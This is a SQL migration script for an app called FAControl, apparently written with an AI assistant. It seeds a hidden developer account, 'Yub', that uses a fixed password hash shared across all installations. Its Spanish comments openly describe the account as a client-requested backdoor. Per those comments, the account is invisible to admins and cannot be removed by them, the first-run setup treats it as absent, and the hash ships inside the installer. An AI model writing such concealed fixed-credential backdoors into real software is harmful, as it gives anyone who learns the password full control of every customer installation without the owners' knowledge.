-- =============================================================
-- FAControl — Cuenta de respaldo del desarrollador
-- Script: 020_usuario_programador.sql
-- Pedido del cliente (2026-07-29): "agreguemos también un usuario por default
-- de tipo Programador... aún debe pedir credenciales al instalar como si el
-- user programador no existiera, pero sí estará. Esto se usará como puerta
-- trasera para cuando el admin olvide las contraseñas."
--
-- CÓMO FUNCIONA
--  * Se siembra la cuenta con el rol global `Programador` (017), que ya está
--    blindado en UsuarioService: ningún Admin la ve, ni la edita, ni la borra,
--    ni le cambia la contraseña. Solo otro Programador.
--  * El wizard de primer arranque SIGUE apareciendo: la app pregunta si existe
--    algún usuario "del negocio" y esta cuenta queda fuera de esa cuenta
--    (UsuarioRepository.ExisteAlgunUsuarioAsync excluye el rol Programador).
--  * La contraseña va SOLO como hash BCrypt (cost 12). En este archivo, en el
--    repositorio y en el instalador no hay ninguna contraseña en claro.
--    El usuario y la contraseña en claro están únicamente en el MD privado del
--    desarrollador, en "Freelancer - Claude Save\docs\Done".
--
-- HASTA DÓNDE PROTEGE (sin adornos)
--  Esto es una puerta trasera con contraseña fija, igual en todas las
--  instalaciones. Sirve para lo que se pidió — rescatar al cliente cuando pierde
--  sus contraseñas — pero hay que tenerlo claro:
--   * quien conozca esa contraseña entra como autoridad total en CUALQUIER
--     instalación de FAControl, no solo en la de este cliente;
--   * el hash viaja en el instalador, así que se puede intentar romper offline
--     (BCrypt cost 12 lo hace lento, no imposible: la fuerza real la da el
--     largo de la contraseña).
--  Recomendación: cambiarle la contraseña por cliente después de instalar
--  (entrando como Yub → Configuración → cambiar contraseña) y anotarla en el
--  expediente del cliente. La app lo permite y no rompe nada.
--
-- Todo login de esta cuenta queda en `auditoria` y con Warning en el log de
-- Serilog, para que se pueda ver cuándo se usó la puerta trasera.
--
-- MIGRACION para bases existentes; las nuevas reciben lo mismo desde 001.
-- Idempotente: si la cuenta ya existe no se toca (no le pisa la contraseña a
-- quien ya se la cambió).
-- =============================================================
SET NAMES utf8mb4;
USE facontrol_db;

INSERT INTO usuario (username, password_hash, nombre, apellido, rol_id, activo)
SELECT 'Yub',
       '$2a$12$JVW4T7UnLXu.n6k2f13N6.vQj3jShwGDVBegNh8HqTrC80yQZjie6',
       'Yuber', 'Santana',
       (SELECT id FROM rol WHERE nombre = 'Programador' AND modo IS NULL LIMIT 1),
       1
FROM DUAL
WHERE EXISTS (SELECT 1 FROM rol WHERE nombre = 'Programador' AND modo IS NULL)
  AND NOT EXISTS (
    SELECT 1 FROM (SELECT id FROM usuario WHERE username = 'Yub') AS existente
  );

-- Verificación (informativa al correr el script a mano)
SELECT u.id, u.username, u.nombre, r.nombre AS rol, u.activo,
       (SELECT COUNT(*) FROM usuario_permiso up WHERE up.usuario_id = u.id) AS permisos
FROM usuario u
LEFT JOIN rol r ON r.id = u.rol_id
WHERE u.username = 'Yub';
